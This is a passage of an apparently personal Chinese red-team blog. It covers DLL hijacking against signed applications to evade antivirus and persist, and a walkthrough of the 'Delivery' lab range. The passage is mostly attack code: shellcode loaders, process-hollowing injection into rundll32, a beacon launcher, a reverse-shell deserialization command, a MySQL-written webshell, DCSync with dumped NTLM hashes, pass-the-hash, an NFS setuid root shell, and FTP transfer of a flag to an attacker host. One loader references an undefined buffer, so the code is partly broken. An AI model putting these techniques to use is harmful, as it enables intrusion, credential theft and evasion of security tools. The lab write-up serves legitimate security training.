class=\"line\">    HMODULE hMod1 &#x3D; LoadLibrary(tszDllPath);</span><br><span class=\"line\"> </span><br><span class=\"line\">    SuperDllHijack(L&quot;mydll.dll&quot;, hMod1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class=\"line\">                       DWORD  ul_reason_for_call,</span><br><span class=\"line\">                       LPVOID lpReserved</span><br><span class=\"line\">                     )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    switch (ul_reason_for_call)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    case DLL_PROCESS_ATTACH:</span><br><span class=\"line\">        DllHijack(hModule);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case DLL_THREAD_ATTACH:</span><br><span class=\"line\">    case DLL_THREAD_DETACH:</span><br><span class=\"line\">    case DLL_PROCESS_DETACH:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>但是本地库函里参数变更，没法实验。</p>\n<h1 id=\"实际利用\"><a href=\"#实际利用\" class=\"headerlink\" title=\"实际利用\"></a>实际利用</h1><h2 id=\"白加黑\"><a href=\"#白加黑\" class=\"headerlink\" title=\"白加黑\"></a>白加黑</h2><p>杀软在检测一个应用是否为病毒的时候，首先会通过黑白名单校验-病毒特征库查询-上传云查杀，在黑白名单校验阶段，如果是白名单中的应用则可以成功运行，白名单也就是有数字签名的应用，我们可以通过修改有数字签名应用中的dll，当该应用启动时会调用该dll，从而执行恶意代码。</p>\n<h2 id=\"DLL加载上线\"><a href=\"#DLL加载上线\" class=\"headerlink\" title=\"DLL加载上线\"></a>DLL加载上线</h2><p>生成shellcode</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823233332667.png\" alt=\"image-20220823233332667\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 入口函数</span><br><span class=\"line\">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        DisableThreadLibraryCalls(hModule);</span><br><span class=\"line\">        unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class=\"line\">        size_t size &#x3D; sizeof(buf);</span><br><span class=\"line\">        char* inject &#x3D; (char *)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">        memcpy(inject, buf, size);</span><br><span class=\"line\">        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)inject, 0, 0, 0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>没做免杀，会报毒，而且这里利用线程去加载shellcode，当qq退出时就会下线，通过dll注入技术，注入迁移到其他进程</p>\n<p><a href=\"https://www.freebuf.com/articles/web/325873.html\">深入理解反射式dll注入技术 - FreeBuf网络安全行业门户</a></p>\n<p><a href=\"https://blog.csdn.net/Cody_Ren/article/details/100053434\">DLL注入的8种姿势_dajiiii的博客dll注入</a></p>\n<p>这里借鉴一下其他师傅的注入代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 入口函数</span><br><span class=\"line\">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tDisableThreadLibraryCalls(hModule);</span><br><span class=\"line\">\t\tunsigned char hexData[] &#x3D; &quot;(shellcode)&quot;;</span><br><span class=\"line\">\t\tchar* v7A &#x3D; (char*)VirtualAlloc(0, _countof(hexData),0x3000u, 0x40u);</span><br><span class=\"line\">\t\tmemcpy((void*)v7A, hexData, _countof(hexData));</span><br><span class=\"line\">\t\tstruct _PROCESS_INFORMATION ProcessInformation;</span><br><span class=\"line\">\t\tstruct _STARTUPINFOA StartupInfo;</span><br><span class=\"line\">\t\tvoid* v24;</span><br><span class=\"line\">\t\tCONTEXT Context;</span><br><span class=\"line\">\t\tDWORD DwWrite &#x3D; 0;</span><br><span class=\"line\">\t\tmemset(&amp;StartupInfo, 0, sizeof(StartupInfo));</span><br><span class=\"line\">\t\tStartupInfo.cb &#x3D; 68;</span><br><span class=\"line\">\t\tBOOL result &#x3D; CreateProcessA(0,(LPSTR)&quot;rundll32.exe&quot;, 0, 0, 0, 0x44u, 0, 0, &amp;StartupInfo,&amp;ProcessInformation);</span><br><span class=\"line\">\t\tif (result)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tContext.ContextFlags &#x3D; 65539;</span><br><span class=\"line\">\t\t\tGetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class=\"line\">\t\t\tv24 &#x3D; VirtualAllocEx(ProcessInformation.hProcess, 0, _countof(hexData), 0x1000u, 0x40u);</span><br><span class=\"line\">\t\t\tWriteProcessMemory(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);</span><br><span class=\"line\">\t\t\tContext.Eip &#x3D; (DWORD)v24;</span><br><span class=\"line\">\t\t\tSetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class=\"line\">\t\t\tResumeThread(ProcessInformation.hThread);</span><br><span class=\"line\">\t\t\tCloseHandle(ProcessInformation.hThread);</span><br><span class=\"line\">\t\t\tresult &#x3D; CloseHandle(ProcessInformation.hProcess);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注入成功，关闭QQ也可达到权限维持目的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220824010754724.png\" alt=\"image-20220824010754724\"></p>\n<p>而且shellcode没有做免杀竟然没有报毒</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220824012022017.png\" alt=\"image-20220824012022017\"></p>\n<p>还有搭配图片的，项目地址：<a href=\"https://github.com/Mr-Un1k0d3r/DKMC\">DKMC - Dont kill my cat - Malicious payload evasion tool</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 入口函数</span><br><span class=\"line\">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tDisableThreadLibraryCalls(hModule);</span><br><span class=\"line\">\t\tFILE* fp; &#x2F;&#x2F; 定义流式文件操作变量fp，FILE结构体在stdio.h里面有定义</span><br><span class=\"line\">\t\tsize_t size; &#x2F;&#x2F; 定义文件字节数变量size</span><br><span class=\"line\">\t\tunsigned char* buffer; &#x2F;&#x2F; 定义缓存指针变量</span><br><span class=\"line\">\t\tfp &#x3D; fopen(&quot;cloudmusic.bmp&quot;, &quot;rb&quot;);&#x2F;&#x2F; fseek()负号前移，正号后移</span><br><span class=\"line\">\t\tfseek(fp, 0, SEEK_END); &#x2F;&#x2F; 文件指针指向文件末尾</span><br><span class=\"line\">\t\t&#x2F;&#x2F; ftell()返回给定流 stream 的当前文件位置</span><br><span class=\"line\">\t\tsize &#x3D; ftell(fp); &#x2F;&#x2F; size值为文件大小</span><br><span class=\"line\">\t\tfseek(fp, 0, SEEK_SET); &#x2F;&#x2F; 文件指针指向文件开头</span><br><span class=\"line\">\t\tbuffer &#x3D; (unsigned char*)malloc(size); &#x2F;&#x2F; 动态申请图片大小的内存空间（数组指针）</span><br><span class=\"line\">\t\tfread(buffer, size, 1, fp); &#x2F;&#x2F; 从fp读取和显示1个size大小的数据</span><br><span class=\"line\">\t\tchar* v7A &#x3D; (char*)VirtualAlloc(0, _countof(hexData),0x3000u, 0x40u);</span><br><span class=\"line\">\t\tmemcpy((void*)v7A, hexData, _countof(hexData));</span><br><span class=\"line\">\t\tstruct _PROCESS_INFORMATION ProcessInformation;</span><br><span class=\"line\">\t\tstruct _STARTUPINFOA StartupInfo;</span><br><span class=\"line\">\t\tvoid* v24;</span><br><span class=\"line\">\t\tCONTEXT Context;</span><br><span class=\"line\">\t\tDWORD DwWrite &#x3D; 0;</span><br><span class=\"line\">\t\tmemset(&amp;StartupInfo, 0, sizeof(StartupInfo));</span><br><span class=\"line\">\t\tStartupInfo.cb &#x3D; 68;</span><br><span class=\"line\">\t\tBOOL result &#x3D; CreateProcessA(0,(LPSTR)&quot;rundll32.exe&quot;, 0, 0, 0, 0x44u, 0, 0, &amp;StartupInfo,&amp;ProcessInformation);</span><br><span class=\"line\">\t\tif (result)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tContext.ContextFlags &#x3D; 65539;</span><br><span class=\"line\">\t\t\tGetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class=\"line\">\t\t\tv24 &#x3D; VirtualAllocEx(ProcessInformation.hProcess, 0, _countof(hexData), 0x1000u, 0x40u);</span><br><span class=\"line\">\t\t\tWriteProcessMemory(ProcessInformation.hProcess, v24, v7A, _countof(hexData), &amp;DwWrite);</span><br><span class=\"line\">\t\t\tContext.Eip &#x3D; (DWORD)v24;</span><br><span class=\"line\">\t\t\tSetThreadContext(ProcessInformation.hThread, &amp;Context);</span><br><span class=\"line\">\t\t\tResumeThread(ProcessInformation.hThread);</span><br><span class=\"line\">\t\t\tCloseHandle(ProcessInformation.hThread);</span><br><span class=\"line\">\t\t\tresult &#x3D; CloseHandle(ProcessInformation.hProcess);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"文件关联程序DLL劫持\"><a href=\"#文件关联程序DLL劫持\" class=\"headerlink\" title=\"文件关联程序DLL劫持\"></a>文件关联程序DLL劫持</h2><p>挖掘默认文件相关联应用程序存不存在dll劫持，比如打开图片，默认为某种看图软件，当双击图片便加载dll</p>\n<h2 id=\"加载exe\"><a href=\"#加载exe\" class=\"headerlink\" title=\"加载exe\"></a>加载exe</h2><p>上传一个exe(做好免杀)，dll加载去执行远控木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 入口函数</span><br><span class=\"line\">BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        DisableThreadLibraryCalls(hModule);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        STARTUPINFO si &#x3D; &#123; sizeof(si) &#125;;</span><br><span class=\"line\">        PROCESS_INFORMATION pi;</span><br><span class=\"line\">        CreateProcess(TEXT(&quot;C:\\\\Users\\\\win7\\\\Desktop\\\\shellcode\\\\beacon.exe&quot;), NULL, NULL, NULL, false, 0, NULL, NULL, &amp;si, &amp;pi);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>这部分就是关于windows提权中的设置，感觉多是一些CVE等。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>文章-基础</p>\n<ul>\n<li><a href=\"https://www.anquanke.com/post/id/225911\">DLL劫持原理及其漏洞挖掘（一）</a></li>\n<li><a href=\"https://yanghaoi.github.io/2021/11/18/dll-jie-chi-lou-dong/\">DLL劫持漏洞 | Yang Hao’s blog</a></li>\n<li><a href=\"https://www.cnblogs.com/lidabo/archive/2013/11/20/3434005.html\">DLL编写教程(绝对经典之作)</a></li>\n</ul>\n<p>文章-提升</p>\n<ul>\n<li><a href=\"https://www.anquanke.com/post/id/232891\">DLL劫持之权限维持篇（二）</a></li>\n<li><a href=\"https://bbs.pediy.com/thread-248050.htm\">一种通用DLL劫持技术研究</a></li>\n<li><a href=\"https://xz.aliyun.com/t/10143\">golang实现dll恶意劫持转发</a></li>\n</ul>\n<p>视频</p>\n<ul>\n<li><a href=\"https://www.bilibili.com/video/BV1S4411e7Mc\">https://www.bilibili.com/video/BV1S4411e7Mc</a></li>\n</ul>\n<p>Attack</p>\n<ul>\n<li><a href=\"http://payloads.online/archivers/2018-06-09/1/\">QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</a></li>\n<li><a href=\"http://payloads.online/archivers/2018-08-15/1/\">Microsoft DirectX SDK June 2010 Xact3.exe DLL Hijacking复现</a></li>\n</ul>\n<p>用到的工具</p>\n<ul>\n<li>Rattler</li>\n<li>Aheadlib</li>\n</ul>\n","categories":["Red-Team"]},{"title":"春秋云境-Delivery","url":"/2025/05/24/Delivery/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/f7484ebd9b5ab806a3b46a8f87f9c72b.png\" style=\"zoom:67%;\" />\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、NFS攻击及提权：<a href=\"https://xz.aliyun.com/news/11110\">Linux提权基础分享和讨论</a></p>\n<hr>\n<table>\n<thead>\n<tr>\n<th>172.22.13.14</th>\n<th>ubuntu</th>\n<th>外网 Spring 服务器</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.22.13.57</td>\n<td>centos</td>\n<td>NFS 服务器</td>\n</tr>\n<tr>\n<td>172.22.13.28</td>\n<td>WIN-HAUWOLAO.xiaorang.lab</td>\n<td>OA 办公平台、MySQL 弱口令 root/123456</td>\n</tr>\n<tr>\n<td>172.22.13.6</td>\n<td>WIN-DC.xiaorang.lab</td>\n<td>域控</td>\n</tr>\n</tbody></table>\n<h1 id=\"XStream\"><a href=\"#XStream\" class=\"headerlink\" title=\"XStream\"></a>XStream</h1><p>有匿名ftp，连接发现pom.xml有xstream，打CVE-2021-29505反序列化</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1098 CommonsCollections6 &quot;bash -c &#123;echo,...&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>fscan</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] Icmp alive hosts len is: 4</span><br><span class=\"line\">172.22.13.14:22 open</span><br><span class=\"line\">172.22.13.14:21 open</span><br><span class=\"line\">172.22.13.6:139 open</span><br><span class=\"line\">172.22.13.28:8000 open</span><br><span class=\"line\">172.22.13.14:8080 open</span><br><span class=\"line\">172.22.13.28:3306 open</span><br><span class=\"line\">172.22.13.28:445 open</span><br><span class=\"line\">172.22.13.6:445 open</span><br><span class=\"line\">172.22.13.28:139 open</span><br><span class=\"line\">172.22.13.28:135 open</span><br><span class=\"line\">172.22.13.6:135 open</span><br><span class=\"line\">172.22.13.57:80 open</span><br><span class=\"line\">172.22.13.28:80 open</span><br><span class=\"line\">172.22.13.57:22 open</span><br><span class=\"line\">172.22.13.14:80 open</span><br><span class=\"line\">172.22.13.6:88 open</span><br><span class=\"line\">[*] alive ports len is: 16</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.13.28</span><br><span class=\"line\">   [-&gt;]WIN-HAUWOLAO</span><br><span class=\"line\">   [-&gt;]172.22.13.28</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.22.13.6</span><br><span class=\"line\">   [-&gt;]WIN-DC</span><br><span class=\"line\">   [-&gt;]172.22.13.6</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.13.28       code:200 len:2525   title:欢迎登录OA办公平台</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.13.28:8000  code:200 len:170    title:Nothing Here.</span><br><span class=\"line\">[+] ftp 172.22.13.14:21:anonymous </span><br><span class=\"line\">   [-&gt;]1.txt</span><br><span class=\"line\">   [-&gt;]pom.xml</span><br><span class=\"line\">[*] NetBios 172.22.13.6     [+] DC:XIAORANG\\WIN-DC         </span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.13.57       code:200 len:4833   title:Welcome to CentOS</span><br><span class=\"line\">[*] NetBios 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.22.13.14:8080  code:200 len:3655   title:公司发货单</span><br><span class=\"line\">[+] mysql 172.22.13.28:3306:root 123456</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"横向WEB\"><a href=\"#横向WEB\" class=\"headerlink\" title=\"横向WEB\"></a>横向WEB</h1><p>内网web服务的mysql有弱口令，连上去正好是个phpstudy，写webshell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select &quot;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&quot; into outfile &quot;C:\\\\phpstudy_pro\\\\www\\\\shell.php&quot;</span><br></pre></td></tr></table></figure>\n\n<p>发现web服务是个SYSTEM权限，在域内，信息收集</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:&#x2F;phpstudy_pro&#x2F;WWW&#x2F; &gt;net user &#x2F;domain</span><br><span class=\"line\">\\\\WIN-DC.xiaorang.lab 的用户帐户</span><br><span class=\"line\">-------------------------------------------------------------</span><br><span class=\"line\">Administrator            chenglei                 Guest                    </span><br><span class=\"line\">krbtgt                   zhangtao                 zhangwen</span><br></pre></td></tr></table></figure>\n\n<p>发现chenglei是 <code>ACL Admin</code> 组用户，mimikatz抓到凭证  chenglei/Xt61f3LBhg1</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524152442315.png\" alt=\"image-20250524152442315\"></p>\n<h1 id=\"ACL滥用\"><a href=\"#ACL滥用\" class=\"headerlink\" title=\"ACL滥用\"></a>ACL滥用</h1><p>域用户 chenglei 属于 <code>Acl admin</code> 组用户，直接为用户添加Dcsync权限即可导出hash</p>\n<p>Dacledit</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-dacledit xiaorang.lab&#x2F;chenglei:Xt61f3LBhg1 -action write -rights DCSync -principal chenglei -target-dn &#39;DC&#x3D;xiaorang,DC&#x3D;lab&#39; -dc-ip 172.22.13.6 </span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[*] DACL backed up to dacledit-20250524-034234.bak</span><br><span class=\"line\">[*] DACL modified successfully!</span><br></pre></td></tr></table></figure>\n\n<p>Dcsync</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-secretsdump xiaorang.lab&#x2F;chenglei:Xt61f3LBhg1@WIN-DC.xiaorang.lab -target-ip 172.22.13.6 -dc-ip 172.22.13.6 -just-dc-ntlm -user-status</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)</span><br><span class=\"line\">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:6341235defdaed66fb7b682665752c9a::: (status&#x3D;Enabled)</span><br><span class=\"line\">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status&#x3D;Disabled)</span><br><span class=\"line\">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cb976ec1a1bf8a14a15142c6fecc540e::: (status&#x3D;Disabled)</span><br><span class=\"line\">zhangwen:1104:aad3b435b51404eeaad3b435b51404ee:fa7d776fdfc82d3f43c9d8b7f5312d77::: (status&#x3D;Enabled)</span><br><span class=\"line\">chenglei:1105:aad3b435b51404eeaad3b435b51404ee:0c00801c30594a1b8eaa889d237c5382::: (status&#x3D;Enabled)</span><br><span class=\"line\">zhangtao:1106:aad3b435b51404eeaad3b435b51404ee:e786c4a4987ced162c496d0519496729::: (status&#x3D;Enabled)</span><br><span class=\"line\">WIN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:473c26f05506785c543cec4ab896fc58::: (status&#x3D;Enabled)</span><br><span class=\"line\">WIN-HAUWOLAO$:1103:aad3b435b51404eeaad3b435b51404ee:559508d63ea2452ac185ddc11dc872b5::: (status&#x3D;Enabled)</span><br><span class=\"line\">[*] Cleaning up...</span><br></pre></td></tr></table></figure>\n\n<p>PTH</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-wmiexec xiaorang.lab&#x2F;Administrator@172.22.13.6 -hashes :6341235defdaed66fb7b682665752c9a -codec GBK -shell-type powershell</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"NFS\"><a href=\"#NFS\" class=\"headerlink\" title=\"NFS\"></a>NFS</h1><p>nfs服务默认在2049端口，可以通过rpcinfo命令来确定主机上是否运行或挂载了NFS服务</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q rpcinfo -p 172.22.13.57</span><br></pre></td></tr></table></figure>\n\n<p>查看可被挂载的目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q showmount -e 172.22.13.57</span><br></pre></td></tr></table></figure>\n\n<p>发现是用户的home目录，可以挂载目录并尝试写入ssh，在挂载的时候在kali会卡住，转到入口机ubuntu安装nfs等服务：<a href=\"https://gist.github.com/zkryakgul/bb561235b7f36c57d15a015d20c7e336\">https://gist.github.com/zkryakgul/bb561235b7f36c57d15a015d20c7e336</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524155759785.png\" alt=\"image-20250524155759785\"></p>\n<p>挂载写入ssh</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@ubuntu:&#x2F;tmp# mount -t nfs 172.22.13.57:&#x2F;home&#x2F;joyce &#x2F;tmp&#x2F;nfs_mount</span><br><span class=\"line\">root@ubuntu:&#x2F;tmp# df -h</span><br><span class=\"line\">root@ubuntu:&#x2F;tmp# ssh-keygen -t rsa -b 4096</span><br><span class=\"line\">root@ubuntu:&#x2F;tmp# mkdir &#x2F;tmp&#x2F;nfs_mount&#x2F;.ssh</span><br><span class=\"line\">root@ubuntu:&#x2F;tmp# cd &#x2F;tmp&#x2F;nfs_mount&#x2F;.ssh</span><br><span class=\"line\">root@ubuntu:&#x2F;tmp# cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub &gt;&gt; authorized_keys</span><br><span class=\"line\">root@ubuntu:&#x2F;tmp# ssh joyce@172.22.13.57</span><br></pre></td></tr></table></figure>\n\n<p>suid发现ftp提权</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524161439194.png\" alt=\"image-20250524161439194\"></p>\n<p>ubuntu起一个ftp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m pyftpdlib -p 6666 -u test -P test -w &amp;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250524161359475.png\" alt=\"image-20250524161359475\"></p>\n<p>nfs连接ftp，将txt推过去</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp 172.22.13.14 6666</span><br><span class=\"line\">test&#x2F;test</span><br><span class=\"line\">put &#x2F;flag02.txt</span><br></pre></td></tr></table></figure>\n\n<p>还有一种提权方法，利用条件：<code>no_root_squash</code> 选项开启</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@ubuntu:&#x2F;tmp# echo &#39;int main() &#123; setgid(0); setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;&#39; &gt; root.c</span><br><span class=\"line\">root@ubuntu:&#x2F;tmp# gcc root.c -o root</span><br><span class=\"line\">root.c: In function ‘main’:</span><br><span class=\"line\">root.c:1:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]</span><br><span class=\"line\">    1 | int main() &#123; setgid(0); setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;</span><br><span class=\"line\">      |              ^~~~~~</span><br><span class=\"line\">root.c:1:25: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]</span><br><span class=\"line\">    1 | int main() &#123; setgid(0); setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;</span><br><span class=\"line\">      |                         ^~~~~~</span><br><span class=\"line\">root.c:1:36: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]</span><br><span class=\"line\">    1 | int main() &#123; setgid(0); setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;</span><br><span class=\"line\">      |                                    ^~~~~~</span><br><span class=\"line\">root@ubuntu:&#x2F;tmp# chmod +s .&#x2F;root</span><br><span class=\"line\">root@ubuntu:&#x2F;tmp# mv .&#x2F;root nfs_mount&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[joyce@centos tmp]$ cd ~</span><br><span class=\"line\">[joyce@centos ~]$ ls</span><br><span class=\"line\">root</span><br><span class=\"line\">[joyce@centos ~]$ .&#x2F;root</span><br><span class=\"line\">[root@centos ~]# cat &#x2F;flag*</span><br><span class=\"line\"> SSS  h           d                CCC            d           t         l     </span><br><span class=\"line\">S     h           d               C               d           t  ii     l     </span><br><span class=\"line\"> SSS  hhh   aa  ddd ooo w   w     C    rrr eee  ddd eee nnn  ttt     aa l  ss </span><br><span class=\"line\">    S h  h a a d  d o o w w w     C    r   e e d  d e e n  n  t  ii a a l  s  </span><br><span class=\"line\">SSSS  h  h aaa  ddd ooo  w w       CCC r   ee   ddd ee  n  n  tt ii aaa l ss  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">flag02: flag&#123;955bc5d2-9fe2-446e-8009-927ae5b32cf2&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">hint: relay race</span><br></pre></td></tr></table></figure>","categories":["云境靶场"]},{"title":"春秋云境-Exchange","url":"/2025/03/01/Exchange/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/738f06111421dfe659b13897eb7c29a5.png\" style=\"zoom:67%;\" />\n\n\n<h1 id=\"学习点\"><a href=\"#学习点\" class=\"headerlink\" title=\"学习点\"></a>学习点</h1><p>一、Exchange Server 攻击面</p>\n<p><a href=\"https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/Exchange.md\">1earn/Exchange</a> 、<a href=\"https://www.geekby.site/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/\">exchange相关漏洞复现</a> 、<a 